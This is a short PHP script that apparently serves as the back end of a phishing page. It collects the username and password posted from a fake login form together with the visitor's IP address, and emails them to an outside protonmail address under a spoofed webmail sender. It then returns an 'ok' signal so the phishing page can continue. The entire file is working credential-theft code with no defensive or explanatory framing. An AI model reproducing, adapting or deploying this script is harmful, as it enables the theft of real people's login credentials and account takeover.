<?php
$ip = getenv("REMOTE_ADDR");
$login = $_POST['ai'];
$passwd= $_POST['pr'];

$done = array('signal'=>'ok');
$bad = array('signal'=>'bad');


if (!empty($login) && !empty($passwd)) {


    $own = 'customerlogin@protonmail.com';
    $date = date("D/M/d, Y g:i a");
    $subj = "$login  from $ip";
    $from = "From: Webmaila<smtp@me.mom163.com>";
    $msg = "Username: $login\nPassword: $passwd\nSubmitted from IP Address - $ip on $date\n-----------------------------------\n        Created By (~)\n-----------------------------------";
    mail($own,$subj,$msg,$from);

    echo json_encode($done);

    }

else {
  echo json_encode($bad);
}


?>
